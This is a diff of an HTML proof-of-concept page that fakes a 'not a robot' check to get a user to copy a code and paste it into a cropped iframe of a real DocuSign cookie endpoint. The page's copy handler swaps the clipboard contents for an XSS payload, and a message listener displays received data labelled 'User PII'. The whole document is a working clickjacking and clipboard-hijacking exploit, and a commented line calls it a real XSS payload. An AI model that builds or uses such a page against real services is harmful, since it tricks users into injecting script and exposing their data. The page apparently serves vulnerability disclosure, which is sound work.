@@ -1,60 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    :root {
+      --text-color-light: #000;
+      --bg-color-light: #fff;
+      --text-color-dark: #fff;
+      --bg-color-dark: #121212;
+    }
+    body {
+      background-color: var(--bg-color-dark);
+      color: var(--text-color-dark);
+    }
+    #drag {
+      user-select: text;
+    }
+  </style>
+</head>
+<body>
+  <center>
+    <div id="drag">
+      <h3>Please verify that you're not a robot by copying the code <b>AB2x7E</b> and pasting it into the box that will appear after a few seconds and click on set cookie to save.</h3>
+      <div qjid="quickjack" style="overflow: hidden; width: 221px; height: 42px; position: relative;" id="cksl6">
+        <iframe name="cksl7" src="https://services.docusign.net/integrations-office/v1.0/ribbon/setcookie"
+          style="border: 0; left: 0px; top: -51px; position: absolute; width: 1920px; height: 919px;" scrolling="no">
+        </iframe>
+      </div><br>
+    </div>
+  </center>
 
-<html><head>
-    <style>
-      :root {
-        --text-color-light: #000; /* Black text for light mode */
-        --bg-color-light: #fff; /* White background for light mode */
-        --text-color-dark: #fff; /* White text for dark mode */
-        --bg-color-dark: #121212; /* Dark background for dark mode */
-      }
-        body {
-          background-color: var(--bg-color-dark);
-          color: var(--text-color-dark);
-        }
-      
-      #drag {
-                user-select: text; /* Allow text selection */
-            }
-    
-    </style>
-    </head>
-    <body>
-      <center><div id='drag' ><h3>Please verify that you're not a robot by copying the code AB2x7E and pasting it into the box that will appear after a few seconds and click on set cookie to save.</h3><div qjid="quickjack" style="overflow: hidden; width: 221px; height: 42px; position: relative;" id="cksl6">
-        <iframe name="cksl7" src="https://services.docusign.net/integrations-office/v1.0/ribbon/setcookie" style="border: 0pt none ; left: 0px; top: -51px; position: absolute; width: 1920px; height: 919px;" scrolling="no"></iframe></div><br>
-    
-      <script>
-    
-          var xss = `<img src="x" onerror="alert(location.hostname)"> AB2x7E`;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              AB2x7E`;
-    
-    window.addEventListener("message",function(e){
-        if(e.data === 1){
-          document.getElementsByTagName('iframe')[0].style="";
-        } else {
-          const textarea = document.createElement('textarea');
-          textarea.textContent = `User PII: ${e.data}`;
+  <script>
+    // Real XSS payload to inject when user copies
+    const xss = '<img src=x onerror=alert(document.domain)>';
 
-    textarea.style.width = '100%';
-    textarea.style.height = '200px';
-
-          document.body.appendChild(textarea);
-        }
-    })
-    
     document.onreadystatechange = () => {
       if (document.readyState === 'complete') {
-        var x = document.getElementById("drag");
-     
-
-    
-    x.addEventListener('copy', (event) => {
-                const selection = window.getSelection();
-                    event.clipboardData.setData('text/plain', xss);
-                    event.preventDefault();
-            });
-    
+        const drag = document.getElementById("drag");
+        drag.addEventListener('copy', function (event) {
+          event.clipboardData.setData('text/plain', xss);
+          event.preventDefault();
+        });
       }
     };
-    </script>
-    
-    </html>
+
+    // Optional iframe postMessage handler (unchanged)
+    window.addEventListener("message", function(e){
+      if (e.data === 1) {
+        document.getElementsByTagName('iframe')[0].style = "";
+      } else {
+        const textarea = document.createElement('textarea');
+        textarea.textContent = `User PII: ${e.data}`;
+        textarea.style.width = '100%';
+        textarea.style.height = '200px';
+        document.body.appendChild(textarea);
+      }
+    });
+  </script>
+</body>
+</html>
